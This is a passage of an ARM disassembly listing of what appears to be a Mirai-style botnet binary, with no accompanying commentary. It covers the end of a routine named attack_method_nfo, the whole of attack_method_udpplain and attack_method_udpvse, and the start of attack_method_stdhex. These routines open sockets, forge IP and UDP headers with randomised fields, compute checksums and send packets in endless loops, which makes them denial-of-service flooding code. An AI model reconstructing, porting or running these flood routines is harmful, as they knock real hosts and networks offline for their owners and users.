    d550:	eb002c63 	bl	186e4 <rand>
    d554:	e0803fa0 	add	r3, r0, r0, lsr #31
    d558:	e5d5200d 	ldrb	r2, [r5, #13]
    d55c:	e2033001 	and	r3, r3, #1
    d560:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d564:	e2033001 	and	r3, r3, #1
    d568:	e3c22020 	bic	r2, r2, #32
    d56c:	e1822283 	orr	r2, r2, r3, lsl #5
    d570:	e5c5200d 	strb	r2, [r5, #13]
    d574:	e59d2070 	ldr	r2, [sp, #112]	; 0x70
    d578:	e3520000 	cmp	r2, #0
    d57c:	0affff86 	beq	d39c <attack_method_nfo+0x57c>
    d580:	eb002c57 	bl	186e4 <rand>
    d584:	e0803fa0 	add	r3, r0, r0, lsr #31
    d588:	e5d5200d 	ldrb	r2, [r5, #13]
    d58c:	e2033001 	and	r3, r3, #1
    d590:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d594:	e2033001 	and	r3, r3, #1
    d598:	e3c22010 	bic	r2, r2, #16
    d59c:	e1822203 	orr	r2, r2, r3, lsl #4
    d5a0:	e5c5200d 	strb	r2, [r5, #13]
    d5a4:	e59d3074 	ldr	r3, [sp, #116]	; 0x74
    d5a8:	e3530000 	cmp	r3, #0
    d5ac:	0affff7d 	beq	d3a8 <attack_method_nfo+0x588>
    d5b0:	eb002c4b 	bl	186e4 <rand>
    d5b4:	e0803fa0 	add	r3, r0, r0, lsr #31
    d5b8:	e5d5200d 	ldrb	r2, [r5, #13]
    d5bc:	e2033001 	and	r3, r3, #1
    d5c0:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d5c4:	e2033001 	and	r3, r3, #1
    d5c8:	e3c22008 	bic	r2, r2, #8
    d5cc:	e1822183 	orr	r2, r2, r3, lsl #3
    d5d0:	e5c5200d 	strb	r2, [r5, #13]
    d5d4:	e59dc078 	ldr	ip, [sp, #120]	; 0x78
    d5d8:	e35c0000 	cmp	ip, #0
    d5dc:	0affff74 	beq	d3b4 <attack_method_nfo+0x594>
    d5e0:	eb002c3f 	bl	186e4 <rand>
    d5e4:	e0803fa0 	add	r3, r0, r0, lsr #31
    d5e8:	e5d5200d 	ldrb	r2, [r5, #13]
    d5ec:	e2033001 	and	r3, r3, #1
    d5f0:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d5f4:	e2033001 	and	r3, r3, #1
    d5f8:	e3c22004 	bic	r2, r2, #4
    d5fc:	e1822103 	orr	r2, r2, r3, lsl #2
    d600:	e5c5200d 	strb	r2, [r5, #13]
    d604:	e59d007c 	ldr	r0, [sp, #124]	; 0x7c
    d608:	e3500000 	cmp	r0, #0
    d60c:	0affff6b 	beq	d3c0 <attack_method_nfo+0x5a0>
    d610:	eb002c33 	bl	186e4 <rand>
    d614:	e0803fa0 	add	r3, r0, r0, lsr #31
    d618:	e5d5200d 	ldrb	r2, [r5, #13]
    d61c:	e2033001 	and	r3, r3, #1
    d620:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d624:	e2033001 	and	r3, r3, #1
    d628:	e3c22002 	bic	r2, r2, #2
    d62c:	e1822083 	orr	r2, r2, r3, lsl #1
    d630:	e5c5200d 	strb	r2, [r5, #13]
    d634:	e59d1080 	ldr	r1, [sp, #128]	; 0x80
    d638:	e3510000 	cmp	r1, #0
    d63c:	0affff62 	beq	d3cc <attack_method_nfo+0x5ac>
    d640:	eb002c27 	bl	186e4 <rand>
    d644:	e0803fa0 	add	r3, r0, r0, lsr #31
    d648:	e5d5200d 	ldrb	r2, [r5, #13]
    d64c:	e2033001 	and	r3, r3, #1
    d650:	e0433fa0 	sub	r3, r3, r0, lsr #31
    d654:	e3c22001 	bic	r2, r2, #1
    d658:	e2033001 	and	r3, r3, #1
    d65c:	e1833002 	orr	r3, r3, r2
    d660:	e5c5300d 	strb	r3, [r5, #13]
    d664:	e59d2088 	ldr	r2, [sp, #136]	; 0x88
    d668:	e3520000 	cmp	r2, #0
    d66c:	0affff59 	beq	d3d8 <attack_method_nfo+0x5b8>
    d670:	e2850014 	add	r0, r5, #20
    d674:	e59d1084 	ldr	r1, [sp, #132]	; 0x84
    d678:	eb001443 	bl	1278c <rand_str>
    d67c:	eaffff55 	b	d3d8 <attack_method_nfo+0x5b8>
    d680:	e1a0000a 	mov	r0, sl
    d684:	eb0031ed 	bl	19e40 <__GI___libc_close>
    d688:	e28dd0a4 	add	sp, sp, #164	; 0xa4
    d68c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d690:	e12fff1e 	bx	lr
    d694:	e59d2084 	ldr	r2, [sp, #132]	; 0x84
    d698:	e59d1084 	ldr	r1, [sp, #132]	; 0x84
    d69c:	e2829014 	add	r9, r2, #20
    d6a0:	e1a01801 	lsl	r1, r1, #16
    d6a4:	e282b028 	add	fp, r2, #40	; 0x28
    d6a8:	e58d1010 	str	r1, [sp, #16]
    d6ac:	eaffff0c 	b	d2e4 <attack_method_nfo+0x4c4>

0000d6b0 <attack_method_udpplain>:
    d6b0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d6b4:	e24dd02c 	sub	sp, sp, #44	; 0x2c
    d6b8:	e58d1004 	str	r1, [sp, #4]
    d6bc:	e3a01004 	mov	r1, #4
    d6c0:	e1a05002 	mov	r5, r2
    d6c4:	e1a06003 	mov	r6, r3
    d6c8:	e1a07000 	mov	r7, r0
    d6cc:	eb002942 	bl	17bdc <calloc>
    d6d0:	e3a01004 	mov	r1, #4
    d6d4:	e1a0a000 	mov	sl, r0
    d6d8:	e1a00007 	mov	r0, r7
    d6dc:	eb00293e 	bl	17bdc <calloc>
    d6e0:	e3a04801 	mov	r4, #65536	; 0x10000
    d6e4:	e2444001 	sub	r4, r4, #1
    d6e8:	e1a01006 	mov	r1, r6
    d6ec:	e3a02007 	mov	r2, #7
    d6f0:	e1a03004 	mov	r3, r4
    d6f4:	e1a08000 	mov	r8, r0
    d6f8:	e1a00005 	mov	r0, r5
    d6fc:	ebfff30f 	bl	a340 <attack_get_opt_int>
    d700:	e1a0c800 	lsl	ip, r0, #16
    d704:	e1a0c82c 	lsr	ip, ip, #16
    d708:	e1a01006 	mov	r1, r6
    d70c:	e3a02006 	mov	r2, #6
    d710:	e1a03004 	mov	r3, r4
    d714:	e1a00005 	mov	r0, r5
    d718:	e58dc008 	str	ip, [sp, #8]
    d71c:	ebfff307 	bl	a340 <attack_get_opt_int>
    d720:	e1a01006 	mov	r1, r6
    d724:	e1a09800 	lsl	r9, r0, #16
    d728:	e3a02000 	mov	r2, #0
    d72c:	e3a03c02 	mov	r3, #512	; 0x200
    d730:	e1a00005 	mov	r0, r5
    d734:	ebfff301 	bl	a340 <attack_get_opt_int>
    d738:	e3a02001 	mov	r2, #1
    d73c:	e1a03002 	mov	r3, r2
    d740:	e1a0c800 	lsl	ip, r0, #16
    d744:	e1a01006 	mov	r1, r6
    d748:	e1a00005 	mov	r0, r5
    d74c:	e1a0582c 	lsr	r5, ip, #16
    d750:	ebfff2fa 	bl	a340 <attack_get_opt_int>
    d754:	e1a06829 	lsr	r6, r9, #16
    d758:	e3a03000 	mov	r3, #0
    d75c:	e1560004 	cmp	r6, r4
    d760:	120620ff 	andne	r2, r6, #255	; 0xff
    d764:	e58d3024 	str	r3, [sp, #36]	; 0x24
    d768:	e58d3018 	str	r3, [sp, #24]
    d76c:	e58d301c 	str	r3, [sp, #28]
    d770:	e58d3020 	str	r3, [sp, #32]
    d774:	11a03c29 	lsrne	r3, r9, #24
    d778:	e20000ff 	and	r0, r0, #255	; 0xff
    d77c:	11832402 	orrne	r2, r3, r2, lsl #8
    d780:	e58d0010 	str	r0, [sp, #16]
    d784:	158d200c 	strne	r2, [sp, #12]
    d788:	1a000003 	bne	d79c <attack_method_udpplain+0xec>
    d78c:	eb001399 	bl	125f8 <rand_next>
    d790:	e1a00800 	lsl	r0, r0, #16
    d794:	e1a00820 	lsr	r0, r0, #16
    d798:	e58d000c 	str	r0, [sp, #12]
    d79c:	e3570000 	cmp	r7, #0
    d7a0:	0a00004d 	beq	d8dc <attack_method_udpplain+0x22c>
    d7a4:	e3a09000 	mov	r9, #0
    d7a8:	e1a0b009 	mov	fp, r9
    d7ac:	e58d9014 	str	r9, [sp, #20]
    d7b0:	ea00001f 	b	d834 <attack_method_udpplain+0x184>
    d7b4:	e3a00002 	mov	r0, #2
    d7b8:	e1a01000 	mov	r1, r0
    d7bc:	e3a02011 	mov	r2, #17
    d7c0:	eb002623 	bl	17054 <__GI_socket>
    d7c4:	e59dc014 	ldr	ip, [sp, #20]
    d7c8:	e3700001 	cmn	r0, #1
    d7cc:	e2899001 	add	r9, r9, #1
    d7d0:	e28bb018 	add	fp, fp, #24
    d7d4:	e28d1018 	add	r1, sp, #24
    d7d8:	e3a02010 	mov	r2, #16
    d7dc:	e78c0008 	str	r0, [ip, r8]
    d7e0:	0a00003a 	beq	d8d0 <attack_method_udpplain+0x220>
    d7e4:	e3a03000 	mov	r3, #0
    d7e8:	e59dc00c 	ldr	ip, [sp, #12]
    d7ec:	e58d301c 	str	r3, [sp, #28]
    d7f0:	e3a03002 	mov	r3, #2
    d7f4:	e1cd31b8 	strh	r3, [sp, #24]
    d7f8:	e1cdc1ba 	strh	ip, [sp, #26]
    d7fc:	eb0024cd 	bl	16b38 <__GI_bind>
    d800:	e5d63014 	ldrb	r3, [r6, #20]
    d804:	e353001f 	cmp	r3, #31
    d808:	9a00001e 	bls	d888 <attack_method_udpplain+0x1d8>
    d80c:	e59d2014 	ldr	r2, [sp, #20]
    d810:	e1a01006 	mov	r1, r6
    d814:	e7920008 	ldr	r0, [r2, r8]
    d818:	e3a02010 	mov	r2, #16
    d81c:	eb0024e7 	bl	16bc0 <__libc_connect>
    d820:	e59d3014 	ldr	r3, [sp, #20]
    d824:	e1590007 	cmp	r9, r7
    d828:	e2833004 	add	r3, r3, #4
    d82c:	e58d3014 	str	r3, [sp, #20]
    d830:	0a000029 	beq	d8dc <attack_method_udpplain+0x22c>
    d834:	e3a04801 	mov	r4, #65536	; 0x10000
    d838:	e2444001 	sub	r4, r4, #1
    d83c:	e3a01001 	mov	r1, #1
    d840:	e1a00004 	mov	r0, r4
    d844:	eb0028e4 	bl	17bdc <calloc>
    d848:	e59d1008 	ldr	r1, [sp, #8]
    d84c:	e20120ff 	and	r2, r1, #255	; 0xff
    d850:	e1a03421 	lsr	r3, r1, #8
    d854:	e1833402 	orr	r3, r3, r2, lsl #8
    d858:	e59d2004 	ldr	r2, [sp, #4]
    d85c:	e59dc014 	ldr	ip, [sp, #20]
    d860:	e1510004 	cmp	r1, r4
    d864:	e082600b 	add	r6, r2, fp
    d868:	e78c000a 	str	r0, [ip, sl]
    d86c:	11c630b2 	strhne	r3, [r6, #2]
    d870:	1affffcf 	bne	d7b4 <attack_method_udpplain+0x104>
    d874:	eb00135f 	bl	125f8 <rand_next>
    d878:	e59d1004 	ldr	r1, [sp, #4]
    d87c:	e08b6001 	add	r6, fp, r1
    d880:	e1c600b2 	strh	r0, [r6, #2]
    d884:	eaffffca 	b	d7b4 <attack_method_udpplain+0x104>
    d888:	e5964010 	ldr	r4, [r6, #16]
    d88c:	eb001359 	bl	125f8 <rand_next>
    d890:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    d894:	e1a02c24 	lsr	r2, r4, #24
    d898:	e1822421 	orr	r2, r2, r1, lsr #8
    d89c:	e2043cff 	and	r3, r4, #65280	; 0xff00
    d8a0:	e1822403 	orr	r2, r2, r3, lsl #8
    d8a4:	e5d61014 	ldrb	r1, [r6, #20]
    d8a8:	e1822c04 	orr	r2, r2, r4, lsl #24
    d8ac:	e0822130 	add	r2, r2, r0, lsr r1
    d8b0:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    d8b4:	e1a03c22 	lsr	r3, r2, #24
    d8b8:	e1833420 	orr	r3, r3, r0, lsr #8
    d8bc:	e2021cff 	and	r1, r2, #65280	; 0xff00
    d8c0:	e1833401 	orr	r3, r3, r1, lsl #8
    d8c4:	e1833c02 	orr	r3, r3, r2, lsl #24
    d8c8:	e5863004 	str	r3, [r6, #4]
    d8cc:	eaffffce 	b	d80c <attack_method_udpplain+0x15c>
    d8d0:	e28dd02c 	add	sp, sp, #44	; 0x2c
    d8d4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d8d8:	e12fff1e 	bx	lr
    d8dc:	e59dc010 	ldr	ip, [sp, #16]
    d8e0:	e35c0000 	cmp	ip, #0
    d8e4:	1a00000b 	bne	d918 <attack_method_udpplain+0x268>
    d8e8:	e59d4010 	ldr	r4, [sp, #16]
    d8ec:	ea000003 	b	d900 <attack_method_udpplain+0x250>
    d8f0:	e7980104 	ldr	r0, [r8, r4, lsl #2]
    d8f4:	e79a1104 	ldr	r1, [sl, r4, lsl #2]
    d8f8:	eb002572 	bl	16ec8 <__libc_send>
    d8fc:	e2844001 	add	r4, r4, #1
    d900:	e1570004 	cmp	r7, r4
    d904:	e1a02005 	mov	r2, r5
    d908:	e3a03901 	mov	r3, #16384	; 0x4000
    d90c:	cafffff7 	bgt	d8f0 <attack_method_udpplain+0x240>
    d910:	e3a04000 	mov	r4, #0
    d914:	eafffff9 	b	d900 <attack_method_udpplain+0x250>
    d918:	e3a06000 	mov	r6, #0
    d91c:	e1560007 	cmp	r6, r7
    d920:	e1a01005 	mov	r1, r5
    d924:	aafffffb 	bge	d918 <attack_method_udpplain+0x268>
    d928:	e79a4106 	ldr	r4, [sl, r6, lsl #2]
    d92c:	e1a00004 	mov	r0, r4
    d930:	eb001395 	bl	1278c <rand_str>
    d934:	e7980106 	ldr	r0, [r8, r6, lsl #2]
    d938:	e1a01004 	mov	r1, r4
    d93c:	e1a02005 	mov	r2, r5
    d940:	e3a03901 	mov	r3, #16384	; 0x4000
    d944:	eb00255f 	bl	16ec8 <__libc_send>
    d948:	e2866001 	add	r6, r6, #1
    d94c:	eafffff2 	b	d91c <attack_method_udpplain+0x26c>

0000d950 <attack_method_udpvse>:
    d950:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d954:	e1a0a001 	mov	sl, r1
    d958:	e24dd034 	sub	sp, sp, #52	; 0x34
    d95c:	e3a01004 	mov	r1, #4
    d960:	e1a04002 	mov	r4, r2
    d964:	e1a05003 	mov	r5, r3
    d968:	e1a08000 	mov	r8, r0
    d96c:	eb00289a 	bl	17bdc <calloc>
    d970:	e1a01005 	mov	r1, r5
    d974:	e3a02002 	mov	r2, #2
    d978:	e3a03000 	mov	r3, #0
    d97c:	e1a0b000 	mov	fp, r0
    d980:	e1a00004 	mov	r0, r4
    d984:	ebfff26d 	bl	a340 <attack_get_opt_int>
    d988:	e3a03801 	mov	r3, #65536	; 0x10000
    d98c:	e1a0c000 	mov	ip, r0
    d990:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d994:	e2433001 	sub	r3, r3, #1
    d998:	e3a02003 	mov	r2, #3
    d99c:	e1a00004 	mov	r0, r4
    d9a0:	e1a01005 	mov	r1, r5
    d9a4:	e58dc00c 	str	ip, [sp, #12]
    d9a8:	ebfff264 	bl	a340 <attack_get_opt_int>
    d9ac:	e1a01005 	mov	r1, r5
    d9b0:	e3a02004 	mov	r2, #4
    d9b4:	e3a03040 	mov	r3, #64	; 0x40
    d9b8:	e1a07000 	mov	r7, r0
    d9bc:	e1a00004 	mov	r0, r4
    d9c0:	ebfff25e 	bl	a340 <attack_get_opt_int>
    d9c4:	e1a0c000 	mov	ip, r0
    d9c8:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d9cc:	e1a01005 	mov	r1, r5
    d9d0:	e3a02005 	mov	r2, #5
    d9d4:	e3a03000 	mov	r3, #0
    d9d8:	e1a00004 	mov	r0, r4
    d9dc:	e58dc014 	str	ip, [sp, #20]
    d9e0:	ebfff256 	bl	a340 <attack_get_opt_int>
    d9e4:	e3a03801 	mov	r3, #65536	; 0x10000
    d9e8:	e1a0c000 	mov	ip, r0
    d9ec:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d9f0:	e2433001 	sub	r3, r3, #1
    d9f4:	e3a02006 	mov	r2, #6
    d9f8:	e1a00004 	mov	r0, r4
    d9fc:	e1a01005 	mov	r1, r5
    da00:	e58dc018 	str	ip, [sp, #24]
    da04:	ebfff24d 	bl	a340 <attack_get_opt_int>
    da08:	e3a03c69 	mov	r3, #26880	; 0x6900
    da0c:	e2833087 	add	r3, r3, #135	; 0x87
    da10:	e3a02007 	mov	r2, #7
    da14:	e1a01005 	mov	r1, r5
    da18:	e1a06000 	mov	r6, r0
    da1c:	e1a00004 	mov	r0, r4
    da20:	ebfff246 	bl	a340 <attack_get_opt_int>
    da24:	e1a04000 	mov	r4, r0
    da28:	e3a0000d 	mov	r0, #13
    da2c:	eb0016bb 	bl	13520 <table_unlock_val>
    da30:	e28d1028 	add	r1, sp, #40	; 0x28
    da34:	e3a0000d 	mov	r0, #13
    da38:	eb001687 	bl	1345c <table_retrieve_val>
    da3c:	e3a01003 	mov	r1, #3
    da40:	e58d0024 	str	r0, [sp, #36]	; 0x24
    da44:	e3a02011 	mov	r2, #17
    da48:	e3a00002 	mov	r0, #2
    da4c:	eb002580 	bl	17054 <__GI_socket>
    da50:	e3700001 	cmn	r0, #1
    da54:	e1a09000 	mov	r9, r0
    da58:	0a0000c6 	beq	dd78 <attack_method_udpvse+0x428>
    da5c:	e28d3030 	add	r3, sp, #48	; 0x30
    da60:	e3a02001 	mov	r2, #1
    da64:	e5232004 	str	r2, [r3, #-4]!
    da68:	e3a0c004 	mov	ip, #4
    da6c:	e3a01000 	mov	r1, #0
    da70:	e2822002 	add	r2, r2, #2
    da74:	e58dc000 	str	ip, [sp]
    da78:	eb002563 	bl	1700c <__GI_setsockopt>
    da7c:	e3700001 	cmn	r0, #1
    da80:	0a0000ba 	beq	dd70 <attack_method_udpvse+0x420>
    da84:	e1a0e804 	lsl	lr, r4, #16
    da88:	e1a00807 	lsl	r0, r7, #16
    da8c:	e1a0c806 	lsl	ip, r6, #16
    da90:	e3a04000 	mov	r4, #0
    da94:	e1a01820 	lsr	r1, r0, #16
    da98:	e1a0282c 	lsr	r2, ip, #16
    da9c:	e1a0382e 	lsr	r3, lr, #16
    daa0:	e3580000 	cmp	r8, #0
    daa4:	e58d402c 	str	r4, [sp, #44]	; 0x2c
    daa8:	e58d1010 	str	r1, [sp, #16]
    daac:	e58d201c 	str	r2, [sp, #28]
    dab0:	e58d3020 	str	r3, [sp, #32]
    dab4:	0a000048 	beq	dbdc <attack_method_udpvse+0x28c>
    dab8:	e59d5020 	ldr	r5, [sp, #32]
    dabc:	e1a03c01 	lsl	r3, r1, #24
    dac0:	e1a02c02 	lsl	r2, r2, #24
    dac4:	e1a01c05 	lsl	r1, r5, #24
    dac8:	e1a03823 	lsr	r3, r3, #16
    dacc:	e1a02822 	lsr	r2, r2, #16
    dad0:	e1a01821 	lsr	r1, r1, #16
    dad4:	e1835c20 	orr	r5, r3, r0, lsr #24
    dad8:	e1826c2c 	orr	r6, r2, ip, lsr #24
    dadc:	e1817c2e 	orr	r7, r1, lr, lsr #24
    dae0:	e3a01001 	mov	r1, #1
    dae4:	e3a00080 	mov	r0, #128	; 0x80
    dae8:	eb00283b 	bl	17bdc <calloc>
    daec:	e59d202c 	ldr	r2, [sp, #44]	; 0x2c
    daf0:	e1a03282 	lsl	r3, r2, #5
    daf4:	e0433182 	sub	r3, r3, r2, lsl #3
    daf8:	e78b0104 	str	r0, [fp, r4, lsl #2]
    dafc:	e083300a 	add	r3, r3, sl
    db00:	e79be102 	ldr	lr, [fp, r2, lsl #2]
    db04:	e58d3008 	str	r3, [sp, #8]
    db08:	e5de3000 	ldrb	r3, [lr]
    db0c:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    db10:	e3833040 	orr	r3, r3, #64	; 0x40
    db14:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    db18:	e5ce3000 	strb	r3, [lr]
    db1c:	e5de2000 	ldrb	r2, [lr]
    db20:	e3c2200a 	bic	r2, r2, #10
    db24:	e3822005 	orr	r2, r2, #5
    db28:	e5ce2000 	strb	r2, [lr]
    db2c:	e59dc00c 	ldr	ip, [sp, #12]
    db30:	e5cec001 	strb	ip, [lr, #1]
    db34:	e59d2028 	ldr	r2, [sp, #40]	; 0x28
    db38:	e1a02802 	lsl	r2, r2, #16
    db3c:	e282c602 	add	ip, r2, #2097152	; 0x200000
    db40:	e1a0342c 	lsr	r3, ip, #8
    db44:	e2033cff 	and	r3, r3, #65280	; 0xff00
    db48:	e1833c2c 	orr	r3, r3, ip, lsr #24
    db4c:	e1a02822 	lsr	r2, r2, #16
    db50:	e1ce30b2 	strh	r3, [lr, #2]
    db54:	e282200c 	add	r2, r2, #12
    db58:	e59d3014 	ldr	r3, [sp, #20]
    db5c:	e1a02802 	lsl	r2, r2, #16
    db60:	e59dc018 	ldr	ip, [sp, #24]
    db64:	e5ce3008 	strb	r3, [lr, #8]
    db68:	e1a03422 	lsr	r3, r2, #8
    db6c:	e2033cff 	and	r3, r3, #65280	; 0xff00
    db70:	e35c0000 	cmp	ip, #0
    db74:	e183cc22 	orr	ip, r3, r2, lsr #24
    db78:	e3a03011 	mov	r3, #17
    db7c:	e5ce3009 	strb	r3, [lr, #9]
    db80:	e59f31fc 	ldr	r3, [pc, #508]	; dd84 <attack_method_udpvse+0x434>
    db84:	13a02040 	movne	r2, #64	; 0x40
    db88:	11ce20b6 	strhne	r2, [lr, #6]
    db8c:	e5932000 	ldr	r2, [r3]
    db90:	e58e200c 	str	r2, [lr, #12]
    db94:	e59d2008 	ldr	r2, [sp, #8]
    db98:	e5923010 	ldr	r3, [r2, #16]
    db9c:	e58e3010 	str	r3, [lr, #16]
    dba0:	e3e03000 	mvn	r3, #0
    dba4:	e28e4014 	add	r4, lr, #20
    dba8:	e58e301c 	str	r3, [lr, #28]
    dbac:	e1ce50b4 	strh	r5, [lr, #4]
    dbb0:	e28e0020 	add	r0, lr, #32
    dbb4:	e1c4c0b4 	strh	ip, [r4, #4]
    dbb8:	e1c470b2 	strh	r7, [r4, #2]
    dbbc:	e1ce61b4 	strh	r6, [lr, #20]
    dbc0:	e59d2028 	ldr	r2, [sp, #40]	; 0x28
    dbc4:	eb001bf3 	bl	14b98 <util_memcpy>
    dbc8:	e59d302c 	ldr	r3, [sp, #44]	; 0x2c
    dbcc:	e2834001 	add	r4, r3, #1
    dbd0:	e1540008 	cmp	r4, r8
    dbd4:	e58d402c 	str	r4, [sp, #44]	; 0x2c
    dbd8:	baffffc0 	blt	dae0 <attack_method_udpvse+0x190>
    dbdc:	e3a03000 	mov	r3, #0
    dbe0:	e3580000 	cmp	r8, #0
    dbe4:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    dbe8:	0afffffb 	beq	dbdc <attack_method_udpvse+0x28c>
    dbec:	e1a00003 	mov	r0, r3
    dbf0:	e1a03280 	lsl	r3, r0, #5
    dbf4:	e0433180 	sub	r3, r3, r0, lsl #3
    dbf8:	e083300a 	add	r3, r3, sl
    dbfc:	e5d32014 	ldrb	r2, [r3, #20]
    dc00:	e79b5100 	ldr	r5, [fp, r0, lsl #2]
    dc04:	e3a07801 	mov	r7, #65536	; 0x10000
    dc08:	e352001f 	cmp	r2, #31
    dc0c:	e2477001 	sub	r7, r7, #1
    dc10:	e2856014 	add	r6, r5, #20
    dc14:	9a000030 	bls	dcdc <attack_method_udpvse+0x38c>
    dc18:	e59d3010 	ldr	r3, [sp, #16]
    dc1c:	e1530007 	cmp	r3, r7
    dc20:	0a000045 	beq	dd3c <attack_method_udpvse+0x3ec>
    dc24:	e59dc01c 	ldr	ip, [sp, #28]
    dc28:	e15c0007 	cmp	ip, r7
    dc2c:	0a000047 	beq	dd50 <attack_method_udpvse+0x400>
    dc30:	e59d1020 	ldr	r1, [sp, #32]
    dc34:	e1510007 	cmp	r1, r7
    dc38:	0a000049 	beq	dd64 <attack_method_udpvse+0x414>
    dc3c:	e3a02000 	mov	r2, #0
    dc40:	e1c520ba 	strh	r2, [r5, #10]
    dc44:	e3a01014 	mov	r1, #20
    dc48:	e1a00005 	mov	r0, r5
    dc4c:	eb000307 	bl	e870 <checksum_generic>
    dc50:	e3a03000 	mov	r3, #0
    dc54:	e1c500ba 	strh	r0, [r5, #10]
    dc58:	e1c630b6 	strh	r3, [r6, #6]
    dc5c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    dc60:	e1a01006 	mov	r1, r6
    dc64:	e1d620b4 	ldrh	r2, [r6, #4]
    dc68:	e283300c 	add	r3, r3, #12
    dc6c:	e1a00005 	mov	r0, r5
    dc70:	eb000312 	bl	e8c0 <checksum_tcpudp>
    dc74:	e59d302c 	ldr	r3, [sp, #44]	; 0x2c
    dc78:	e1a0e283 	lsl	lr, r3, #5
    dc7c:	e1c600b6 	strh	r0, [r6, #6]
    dc80:	e04ee183 	sub	lr, lr, r3, lsl #3
    dc84:	e1d660b2 	ldrh	r6, [r6, #2]
    dc88:	e59d2028 	ldr	r2, [sp, #40]	; 0x28
    dc8c:	e08ee00a 	add	lr, lr, sl
    dc90:	e1ce60b2 	strh	r6, [lr, #2]
    dc94:	e3a03901 	mov	r3, #16384	; 0x4000
    dc98:	e3a0c010 	mov	ip, #16
    dc9c:	e1a01005 	mov	r1, r5
    dca0:	e2822020 	add	r2, r2, #32
    dca4:	e1a00009 	mov	r0, r9
    dca8:	e58de000 	str	lr, [sp]
    dcac:	e58dc004 	str	ip, [sp, #4]
    dcb0:	eb0024b3 	bl	16f84 <__libc_sendto>
    dcb4:	e59d302c 	ldr	r3, [sp, #44]	; 0x2c
    dcb8:	e2830001 	add	r0, r3, #1
    dcbc:	e1500008 	cmp	r0, r8
    dcc0:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    dcc4:	baffffc9 	blt	dbf0 <attack_method_udpvse+0x2a0>
    dcc8:	e3a03000 	mov	r3, #0
    dccc:	e3580000 	cmp	r8, #0
    dcd0:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    dcd4:	0affffc0 	beq	dbdc <attack_method_udpvse+0x28c>
    dcd8:	eaffffc3 	b	dbec <attack_method_udpvse+0x29c>
    dcdc:	e5934010 	ldr	r4, [r3, #16]
    dce0:	eb001244 	bl	125f8 <rand_next>
    dce4:	e59d302c 	ldr	r3, [sp, #44]	; 0x2c
    dce8:	e1a01283 	lsl	r1, r3, #5
    dcec:	e0411183 	sub	r1, r1, r3, lsl #3
    dcf0:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    dcf4:	e1a02c24 	lsr	r2, r4, #24
    dcf8:	e182242c 	orr	r2, r2, ip, lsr #8
    dcfc:	e081100a 	add	r1, r1, sl
    dd00:	e2043cff 	and	r3, r4, #65280	; 0xff00
    dd04:	e5d1c014 	ldrb	ip, [r1, #20]
    dd08:	e1822403 	orr	r2, r2, r3, lsl #8
    dd0c:	e1822c04 	orr	r2, r2, r4, lsl #24
    dd10:	e0822c30 	add	r2, r2, r0, lsr ip
    dd14:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    dd18:	e1a03c22 	lsr	r3, r2, #24
    dd1c:	e1833420 	orr	r3, r3, r0, lsr #8
    dd20:	e2021cff 	and	r1, r2, #65280	; 0xff00
    dd24:	e1833401 	orr	r3, r3, r1, lsl #8
    dd28:	e1833c02 	orr	r3, r3, r2, lsl #24
    dd2c:	e5853010 	str	r3, [r5, #16]
    dd30:	e59d3010 	ldr	r3, [sp, #16]
    dd34:	e1530007 	cmp	r3, r7
    dd38:	1affffb9 	bne	dc24 <attack_method_udpvse+0x2d4>
    dd3c:	eb00122d 	bl	125f8 <rand_next>
    dd40:	e59dc01c 	ldr	ip, [sp, #28]
    dd44:	e15c0007 	cmp	ip, r7
    dd48:	e1c500b4 	strh	r0, [r5, #4]
    dd4c:	1affffb7 	bne	dc30 <attack_method_udpvse+0x2e0>
    dd50:	eb001228 	bl	125f8 <rand_next>
    dd54:	e59d1020 	ldr	r1, [sp, #32]
    dd58:	e1510007 	cmp	r1, r7
    dd5c:	e1c501b4 	strh	r0, [r5, #20]
    dd60:	1affffb5 	bne	dc3c <attack_method_udpvse+0x2ec>
    dd64:	eb001223 	bl	125f8 <rand_next>
    dd68:	e1c600b2 	strh	r0, [r6, #2]
    dd6c:	eaffffb2 	b	dc3c <attack_method_udpvse+0x2ec>
    dd70:	e1a00009 	mov	r0, r9
    dd74:	eb003031 	bl	19e40 <__GI___libc_close>
    dd78:	e28dd034 	add	sp, sp, #52	; 0x34
    dd7c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    dd80:	e12fff1e 	bx	lr
    dd84:	0002b8ac 	.word	0x0002b8ac

0000dd88 <attack_method_stdhex>:
    dd88:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    dd8c:	e24dd03c 	sub	sp, sp, #60	; 0x3c
    dd90:	e58d1000 	str	r1, [sp]
    dd94:	e3a01004 	mov	r1, #4
    dd98:	e1a04003 	mov	r4, r3
    dd9c:	e1a05002 	mov	r5, r2
    dda0:	e1a07000 	mov	r7, r0
    dda4:	eb00278c 	bl	17bdc <calloc>
    dda8:	e3a01004 	mov	r1, #4
    ddac:	e1a09000 	mov	r9, r0
    ddb0:	e1a00007 	mov	r0, r7
    ddb4:	eb002788 	bl	17bdc <calloc>
    ddb8:	e3a06801 	mov	r6, #65536	; 0x10000
    ddbc:	e1a08000 	mov	r8, r0
    ddc0:	e3a00b01 	mov	r0, #1024	; 0x400
    ddc4:	eb002536 	bl	172a4 <malloc>
    ddc8:	e2466001 	sub	r6, r6, #1
    ddcc:	e3a01000 	mov	r1, #0
